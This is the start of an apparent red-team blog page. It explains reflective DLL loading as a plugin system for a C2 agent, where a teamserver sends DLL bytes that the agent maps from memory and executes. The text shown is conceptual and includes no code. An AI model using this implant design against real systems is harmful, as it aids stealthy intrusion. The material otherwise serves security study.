# https://racoten.gitbook.io/red-team-developments-and-operations

<!DOCTYPE html><html lang="en" class="rounded-corners theme-clean no-tint sidebar-default sidebar-list-default links-default depth-subtle __variable_7d5705 __variable_4d8f45 __variable_7857c7 font-Inter sheet-open:gutter-stable light" style="color-scheme: light;"><body class="site-background sheet-open:overflow-hidden"><div><!--$--><!--/$--></div><div class="pointer-events-none fixed inset-x-0 top-0 z-50 h-0.5 overflow-hidden hidden animate-fade-out-slow"><div class="h-full w-full origin-left animate-crawl bg-primary-solid theme-bold:bg-header-link"></div></div><div class="motion-safe:transition-all motion-safe:duration-300 lg:chat-open:mr-80 xl:chat-open:mr-96"><div class="flex flex-col lg:flex-row lg:justify-center px-4 pl-[max(env(safe-area-inset-left),1rem)] pr-[max(env(safe-area-inset-right),1rem)] sm:px-6 sm:pl-[max(env(safe-area-inset-left),1.5rem)] sm:pr-[max(env(safe-area-inset-right),1.5rem)] md:px-8 md:pl-[max(env(safe-area-inset-left),2rem)] md:pr-[max(env(safe-area-inset-right),2rem)] max-w-screen-2xl mx-auto site-width-wide:max-w-screen-4xl transition-[max-width] duration-300"><div id="side-sheet-overlay" class="fixed inset-0 z-40 items-start bg-tint-base/3 not-hydrated:opacity-0 starting:opacity-0 starting:backdrop-blur-none transition-[opacity,display,backdrop-filter] transition-discrete duration-250 dark:bg-tint-base/6 hidden opacity-0 backdrop-blur-none"></div><div class="contents"><div class="contents [--content-scroll-margin:calc(var(--spacing)*16)]"><main class="relative min-w-0 flex-1 max-w-screen-2xl py-8 break-anywhere @container page-width-default site-width-default page-has-toc"><div class="flex flex-col [&amp;>*+*]:mt-5 whitespace-pre-wrap"><h2 id="disclaimer" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#disclaimer"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_838qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_838qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Disclaimer</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The material in this article is provided <strong class="font-bold">for educational purposes only</strong>. Mapping PE images from memory, implementing reflective loaders, and building plugin-style interfaces can be powerful techniques that <strong class="font-bold">must only be used on systems you own or have explicit written permission to test</strong>.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">By using any ideas or code patterns described here, <strong class="font-bold">you accept full responsibility</strong> for complying with all applicable laws, contracts, and policies. The author and publisher <strong class="font-bold">do not endorse or condone illegal activity</strong> and <strong class="font-bold">assume no liability</strong> for misuse, loss, or damages.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">To practice safely:</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Work in an <strong class="font-bold">isolated lab</strong> (offline VMs, snapshots, disposable accounts).</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Keep tests <strong class="font-bold">scoped, logged, and authorized</strong>.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Prefer <strong class="font-bold">well-documented, maintainable implementations</strong> over “clever” evasion.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Treat examples as <strong class="font-bold">starting points</strong>, not turnkey tools; review for correctness, security, and ethics before use.<!-- --></p></div></li></ul><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"></p><h2 id="summary" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#summary"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_8f8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_8f8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Summary</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">I’m going to show a practical way to map a PE DLL straight from memory and call its exported interface functions like hot-swappable plugins. The focus here is on being clear and repeatable: a stable plugin ABI, a predictable mapper, and a test flow you can run on a Friday night without cursing at your screen. To keep this article readable, longer listings stay as code blocks you can drop into your project when you’re ready for testing.</p><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h2 id="table-of-contents" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#table-of-contents"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_8l8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_8l8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Table of Contents</div></h2><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Background</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">The Idea</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">The Journey</p><ul class="min-w-0 space-y-2 page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">What is Reflective DLL Loading?<!-- --></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Where to start?</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Reimplement the Technique</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">A Custom GetProcAddress</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Mapper</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Plugin ABI</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Interface &amp; exports</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Example Module: Command Execution</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Host Test Harness</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Checklist for the harness:</p></div></li></ul></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Extensions</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Going Forward</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Conclusions</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">References</p></div></li></ul><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h2 id="background" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#background"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_8r8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_8r8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Background</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">I fell down this rabbit hole after a few chats about modular “hot plugin” designs (shoutout to @Jonathan Wallace’s TactixC2 threads), plus a lot of tinkering with Windows PE internals and community loaders. The endgame: ship a tiny, in-process mapper; fetch the right DLL when you need it; and call into a clean interface—rather than jumping blindly to a single entry point and hoping for the best.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This style keeps the resident footprint small and avoids spinning up helper processes for every action. In practice: the agent maps a DLL from bytes, resolves a handful of exports, constructs a plugin object, and runs <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">execute(task)</code> with a simple payload.</p><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h2 id="the-idea" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#the-idea"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_938qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_938qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">The Idea</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Here’s the flow I aim for:</p><ol class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'1.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">The teamserver sends an instruction plus the matching plugin DLL bytes.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'2.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">The agent maps that DLL from memory (custom mapper).</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'3.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">The agent locates exports (factory, init, exec, cleanup).</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'4.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 